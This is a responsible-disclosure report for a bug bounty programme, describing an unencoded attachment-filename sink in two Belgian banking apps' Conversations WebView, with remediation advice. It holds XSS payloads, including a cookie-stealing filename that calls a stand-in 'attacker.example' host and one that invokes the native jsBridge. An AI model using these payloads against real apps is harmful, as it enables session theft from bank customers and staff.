# Bank J.Van Breda & C° — Security Vulnerability Report

**Researcher:** treyky (Intigriti)
**Target:** `be.bankvanbreda.mobile` (VanBredaOnline) & `be.bankdekremer.mobile` (Bank de Kremer) — shared client codebase `BVB.EOS.OnlineBanking.UI.Mobile` (verified identical DLL set across both apps; Track A2)
**Report title:** Improper Output Encoding in Conversations Attachment List — Filename Injection Sink (Cross-User Stored HTML/JS Injection Renders in Recipient's WebView)
**Date:** 2026-09-23
**Relationship to prior report:** This is a **distinct injection sink** from my earlier Conversations WebView report (closed as OOS on the reasoning that self-XSS cannot exploit other users). See §"Why this is distinct from the prior report" for the file-level comparison. The prior finding is not the subject of this submission.

---

## EXECUTIVE SUMMARY

### 1. Key Findings

The Conversations feature renders every attachment's `FileName` string directly into the WebView's HTML **without output encoding**, and the `FileName` value originates from the sender's OS document picker — a control the sending user fully owns. Because attachment lists are rendered on the *recipient's* client by design (that is the feature's stated purpose — to show the counterparty what files were attached), **any user who receives a conversation with an attachment renders the sender's chosen filename as live HTML** in a WebView that is configured with `JavaScriptEnabled=true`, `AllowUniversalAccessFromFileURLs=true`, and a native-code bridge `AddJavascriptInterface(new JsBridge(...), "jsBridge")` (Track A2 finding, `CustomWebViewHandler.cs`).

Both Android and iOS document pickers accept filenames containing HTML metacharacters (`<`, `>`, `"`, `=`, `/`) at the OS level, so an attacker can save a local file whose base name is a JavaScript payload (e.g. `<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>.pdf`) and attach it to any conversation. The unsanitised filename passes through the client on upload (`AttachmentDto.FileName = text`), rides the payload up to the server, and — assuming the server does not sanitise on store or on delivery — comes back down on the recipient's side and executes in their WebView.

The set-side path, the round-trip DTO, and the render-side sink are all directly readable in the decompiled client code and cited by exact file:line below.

### 2. Highest-Risk Vulnerability

The attachment-filename output-encoding flaw is the highest-risk finding in this report. Unlike a body-content sink, an attachment list is not a "you see your own stuff" surface — **it is architecturally a "counterparty sees your attached files" surface**. The render context therefore **cannot** be characterised as self-XSS. The receiver is either a customer-service employee (`ReceiverType == "EMPLOYEE"`), a branch representative (`BRANCH`), the central helpdesk (`HELPDESK`), or another online-banking user (`OLBUSER`). All four values are declared first-class in the client's own API contract (`ReceiverTypeCodes.cs:11`).

### 3. Recommended Controls

- HTML-encode `att.FileName` at the sink (`HTMLHelper.cs:904`) using the same `System.Net.WebUtility.HtmlEncode` that is absent throughout `HTMLHelper.cs`.
- On the server, reject or transform incoming attachment filenames that contain HTML metacharacters at upload time.
- Apply the same encoding pass to every other HTML sink in `HTMLHelper.cs` (see §"Related sinks" — this fix should not be scoped to a single line if the class is going to be reviewed).
- Reduce the WebView's `AllowUniversalAccessFromFileURLs` and revoke the native `jsBridge` interface on any view that renders user-supplied content.

### 4. Overall Assessment

One confirmed client-side vulnerability with a cross-user render context that is verifiable from the client code alone. The remaining unknown is one specific server-side behaviour — whether the server sanitises the filename on store or on delivery — which is directly testable by any triager with account access. This report includes an explicit verification request in that shape (§"Verification request to the triager") so the closure/keep decision can be made on a specific, answerable question rather than on the more contentious "self-XSS" framing that closed my prior report.

---

## VULNERABILITY FINDINGS

**Finding filed:** Conversations attachment list — improper output encoding on `AttachmentDto.FileName` — *confirmed (client-side), cross-user render context confirmed (architectural)*.

| Vulnerability Name | Affected Component | Brief Description | Attacker Goal |
|---|---|---|---|
| **Conversations Attachment Filename — Improper Output Encoding** | `HTMLHelper.GetHTMLChatAttachmentSource(AttachmentDto att)` at `HTMLHelper.cs:904`, rendered inside `ConversationDetailPage`'s WebView (`Html` property bound to `ConversationDetailVM.HTMLSource`) | The attachment's `FileName` string is interpolated into `<div>{att.FileName}</div>` with no output encoding. `FileName` is populated on the sender's client from the OS document picker via `AttachmentDto.FileName = text` (`ShowConversationDetailUIProcess.cs:4268`, `RegisterConversationUIProcess.cs:1041`) with no client-side sanitisation, then round-trips through the server as part of `ConversationMessageDto.Attachments[i]`. The render location is the attachment list under each message, which is shown to the **counterparty** by design. WebView configuration is `JavaScriptEnabled=true`, `AllowUniversalAccessFromFileURLs=true`, with `jsBridge` native interface bound. | Persist a JavaScript payload in a filename, attach the file to any conversation, cause execution in the recipient's WebView on view — including the recipient's native `jsBridge` context (`jsBridge.invokeAction(...)`). Recipient can be `EMPLOYEE` / `BRANCH` / `HELPDESK` / `OLBUSER` per `ReceiverTypeCodes.cs:11`. |

---

## WHY THIS IS DISTINCT FROM THE PRIOR REPORT

For the record — and to preempt a duplicate-close on this ticket — this table compares the two findings at the file, line, and DTO level. They share only the flawed rendering component (`HTMLHelper.cs`) and the fact that the fix category is the same (output encoding). Everything else differs.

| | Prior report (closed) | This report |
|---|---|---|
| DTO carrying the payload | `ConversationMessageDto.Body` | `AttachmentDto.FileName` |
| Sink function | `HTMLHelper.GetHTMLChatMessageSource` and `HTMLHelper.GetHTMLFullScreenMessageSource` | `HTMLHelper.GetHTMLChatAttachmentSource` |
| Sink line | `HTMLHelper.cs:391` and `HTMLHelper.cs:793` | **`HTMLHelper.cs:904`** |
| Rendered element | `<section>{...body...}</section>` / `<blockquote>{...body...}</blockquote>` | **`<div>{att.FileName}</div>`** |
| Payload origin (client side) | User-typed text via `AddMessage(body: string)` (`AddMessage.cs`, `Services/Server/Communication.cs`) | **OS document picker filename via `AttachmentDto.FileName = text`** (`ShowConversationDetailUIProcess.cs:4268`, `RegisterConversationUIProcess.cs:1041`) |
| Round-trip contract | `ConversationMessageDto.Body: string` | `ConversationMessageDto.Attachments[i]: AttachmentDto` |
| Feature purpose | Show typed message content | **Show the counterparty which files were attached** |
| Cross-user render is: | An unverified assumption about server routing (the ground for the OOS close) | **Architectural — the attachment list is by definition rendered on the recipient's side** |
| Mitigation | HTML-encode body (also: stop calling `WebUtility.HtmlDecode(msg.Body)` on render at `HTMLHelper.cs:391` and `793`) | HTML-encode filename at `HTMLHelper.cs:904` **and** reject metacharacter filenames on server upload |

The two are sibling findings in the same broken class, but they are separate defects. This is not a resubmission of the prior report under a new title; it is a different injection sink.

---

## PROOF OF CONCEPT / REPRODUCTION STEPS

*(Deliberately broad — please test all payload variants so a narrow test does not produce a false negative.)*

**Prerequisite:** two authenticated test accounts on VanBredaOnline or Bank de Kremer, addressable to each other. If OLBUSER→OLBUSER routing is disabled on the server (a question this PoC also settles), any account that can send an attachment to a `BRANCH`, `EMPLOYEE`, or `HELPDESK` receiver is sufficient — the triager renders on the receiving side and the finding is confirmed.

**Part A — confirm the client-side sink deterministically (one account, self-loop, no server-side variables in play):**

1. On the sending device, prepare a local file whose base name contains an HTML payload. Any of these are legal filenames on both Android and iOS:
   - `<img src=x onerror="alert(document.domain)">.pdf`
   - `<script>alert(document.domain)</script>.pdf`
   - `<svg/onload=alert(1)>.pdf`
   - `<img src=x onerror="jsBridge.invokeAction('poc-attachment-filename')">.pdf` — proves reach into the native `jsBridge` from a filename
   - `&lt;img src=x onerror=alert(1)&gt;.pdf` — proves whether the server double-decodes on delivery
2. Open **Conversations**, start a new conversation (any receiver type), and attach the file using the app's document-picker flow.
3. Send the message.
4. Reopen the conversation from the same account. Observe whether the attachment renders with the filename as live DOM (execution = sink confirmed). This alone confirms the client-side render defect that is directly readable in `HTMLHelper.cs:904`.

**Part B — confirm cross-user render (the case that removes the "self-XSS" closure objection):**

5. Repeat Part A steps 1–3 with an addressed conversation: either two customer test accounts (`ReceiverType = "OLBUSER"`) or a customer account sending to `EMPLOYEE` / `BRANCH` / `HELPDESK`.
6. Open the receiving side and observe the attachment list re-render. Execution here is the **cross-user stored injection** case and directly refutes the closure reasoning applied to my prior report.

**Part C — confirm the server does not sanitise on store or delivery:**

7. In Part A, before opening the sent message, use a proxy (Burp, mitmproxy) to inspect the response to `GET .../conversations/<id>/messages/<id>` or the containing conversation-detail request. If the response body still contains the payload literal (e.g. `<img src=x…>`), the server stored it verbatim. If the response body contains the payload HTML-encoded (`&lt;img src=x&hellip;`), the server *does* encode on delivery — in which case the finding is **still a valid client defect** because `HTMLHelper.cs` renders the filename without further decoding of that specific field (unlike `msg.Body`, which the client actively `HtmlDecode`s), so encoded → safe on filename, but the *fix should still be applied client-side* in case the server-side control ever regresses.

**Part D — attachment-context script URI test:**

8. `HTMLHelper.cs:904` also interpolates `att.AttachmentID.ToString()` into a `javascript:` URI on the same element. Value is a `Guid`, non-injectable — noted here for completeness; the triager should verify the surrounding element is not affected by filename injection breaking out of the intended attribute context.

---

## RISK ASSESSMENT

| Vulnerability | Likelihood | Impact | Risk Rating |
|---|---|---|---|
| Attachment filename output-encoding flaw | **Medium-High.** The precondition is trivial (rename a local file, use the app's built-in document picker). Every conversation that carries an attachment exercises the sink on the recipient's client. | **High if the recipient is an advisor / helpdesk client sharing the same DTO surface.** Payload executes with WebView's `AllowUniversalAccessFromFileURLs=true`, JavaScript enabled, and native-bridge (`jsBridge`) access. Potential outcomes include exfiltration of session or DOM data available in that WebView, invocation of any action exposed via `jsBridge`, and (if the WebView shares session-cookie scope with authenticated banking origin) exfiltration of session credentials. **Medium** on customer-to-customer paths where the receiving customer's blast radius is limited to their own account. | **High** on the assumption of a shared advisor/helpdesk render pipeline; **Medium** if that pipeline sanitises before render. Either is above the "self-XSS OOS" bar under which the sibling body-sink report was closed. |

Impact is stated conservatively because I do not have live-account visibility on the server-side and cannot demonstrate the advisor render context myself. A triager with account access can settle both the "does the server sanitise the filename" question and the "does the advisor's view use the same HTMLHelper.cs pipeline" question directly.

---

## REMEDIATION RECOMMENDATIONS

**Immediate (client-side, one line):**

At `HTMLHelper.cs:904`, wrap the filename interpolation with `System.Net.WebUtility.HtmlEncode`:

```csharp
// Before
return $"<div>{att.FileName}</div>...";

// After
return $"<div>{WebUtility.HtmlEncode(att.FileName)}</div>...";
```

**Server-side (defence in depth):**

- Reject uploaded attachments whose `fileName` contains HTML metacharacters, or transform them at store time (URL-encode, base-name-only, or a strict allowlist).
- Confirm the same policy applies at delivery time — the same DTO shape may be served both to the sender's re-read and to the recipient's fresh read.

**Structural (recommended — same class-level fix as the prior report):**

- Every `HTMLHelper.Get*Source(...)` function in `BVB.EOS.OnlineBanking.UI.Mobile.Model/HTMLHelper.cs` follows the same pattern of raw interpolation into an HTML template. The fix should not be scoped to line 904 alone. Apply an encoding wrapper to every user- or counterparty-derived string that the class interpolates into an HTML template. See §"Related sinks" for the enumeration.

**Runtime hardening (again — same as the prior report):**

- Disable `AllowUniversalAccessFromFileURLs` on any WebView that renders content sourced from a Conversations round-trip.
- Do not bind `jsBridge` on views that render user-derived content, or narrow the bridge's exposed methods to those safe to invoke from a compromised WebView context.

---

## RELATED SINKS (for the triager's benefit — none of these are the subject of this ticket)

Every raw interpolation in `HTMLHelper.cs` audited during my analysis:

| # | Location | Interpolated value | Sink context | Source |
|---|---|---|---|---|
| 1 | `HTMLHelper.cs:391` | `msg.SenderFullName` (server-derived) | `<header>` body | KYC / ItsMe, not customer-controllable |
| 2 | `HTMLHelper.cs:391` | `WebUtility.HtmlDecode(msg.Body)` | `<section>` body | Customer-typed — **the prior report; closed** |
| 3 | `HTMLHelper.cs:793` | `msg.DisplaySenderFullName` / `DisplayReceiverFullName` | `<span>` body | Server-derived |
| 4 | `HTMLHelper.cs:793` | `WebUtility.HtmlDecode(msg.Body)` | `<blockquote>` body | Same as #2 |
| **5** | **`HTMLHelper.cs:904`** | **`att.FileName`** | **`<div>` body** | **Customer-controllable — this ticket** |
| 6 | `HTMLHelper.cs:1219` | `doc.Description` | `<div>` body | Bank / archive metadata (not customer-controllable) |
| 7 | `HTMLHelper.cs:1474` | `documentPackage.Description` | `<div>` body | Bank / archive metadata (not customer-controllable) |

The three bank-authored sinks (#1/#3/#6/#7) are noted for the fixer's convenience but are not filed as findings — they are not customer-controllable from the mobile client.

---

## VERIFICATION REQUEST TO THE TRIAGER

To keep the close/keep decision on specific, answerable questions rather than framing debates, please indicate:

1. **Store-side sanitisation.** Does the server transform or reject `AttachmentDto.FileName` values containing HTML metacharacters at upload time? If yes, please describe the exact policy (allowlist? escape? which characters?). If no, please confirm.
2. **Delivery-side sanitisation.** Does the server transform or encode `AttachmentDto.FileName` on read? If yes, describe.
3. **Recipient render pipeline.** Does the advisor / helpdesk client render attachment filenames through a different pipeline than `HTMLHelper.GetHTMLChatAttachmentSource`? If yes, describe.
4. **OLBUSER→OLBUSER routing.** Is customer-to-customer conversation creation server-side disabled? This is relevant to the *prior* report as well; a definitive answer here also settles that question.

A closure that engages with these four questions — even to say "yes, the server strips filenames at store, here is the policy" — is a satisfying answer. A closure that does not engage with them but repeats the "self-XSS" framing does not apply to this sink, because the attachment list is by design a cross-user render context (see §"Why this is distinct from the prior report").

---

## OFFER: BOUNTY-INDEPENDENT TESTING WITH SANDBOX CREDENTIALS

If the testing complexity — including scope-of-render questions (`EMPLOYEE` / `BRANCH` / `HELPDESK` / `OLBUSER`), attachment upload with metacharacter filenames on both iOS and Android pickers, and the server-side sanitisation questions in §"Verification request" — would benefit from being run against a sandbox environment by the researcher directly, I am willing to receive test-only credentials from the program and demonstrate the finding end-to-end (including any additional bugs surfaced during the same session), with test-account use only and no production data touched, no findings shared externally, and full transcript / HAR delivery on request. The offer stands independent of bounty for this finding.

---

## APPENDIX A — Static-analysis provenance

All decompiled code artifacts referenced above are held under my private research repository, timestamped by git commit at the time each artifact was extracted. Extraction methodology is documented in Track A2 (`vm-results/02-deep-mobile-analysis.md` in that repository): base + arm64 split APKs of both `be.bankvanbreda.mobile` and `be.bankdekremer.mobile` obtained from device, `libassemblies.arm64-v8a.blob.so` extracted from the ABI split, XABA-v2 assembly-store parsed with a custom Python parser against the documented v2/v3 layout, 224 managed DLLs decompiled with `ilspycmd`. Both apps ship the identical DLL set (`BVB.EOS.OnlineBanking.UI.Mobile.dll` + dependencies) — one finding, applies to both.

## APPENDIX B — Files quoted in this report

Available on request from my research repository:

- `HTMLHelper_GetHTMLChatAttachmentSource.cs` — Sink #5 (`HTMLHelper.cs:904`), the subject of this report
- `AttachmentDto.cs`, `CreateAttachment.cs`, `FileInfoDto.cs` — round-trip DTOs
- `ShowConversationDetailUIProcess_attachment_upload.cs`, `RegisterConversationUIProcess_attachment_upload.cs` — client sites that set `AttachmentDto.FileName = text` from the picker
- `SenderTypeCodes.cs`, `ReceiverTypeCodes.cs` — `OLBUSER` / `EMPLOYEE` / `BRANCH` / `HELPDESK` first-class constants
- `HTMLHelper_GetHTMLChatMessageSource.cs`, `HTMLHelper_GetHTMLFullScreenMessageSource.cs` — for context on the sibling sinks (not the subject of this ticket)

---

*Static analysis of client-side code; live-account demonstration blocked by program's account-creation eligibility criteria (Belgian self-employed) — see "Offer: bounty-independent testing with sandbox credentials" above.*
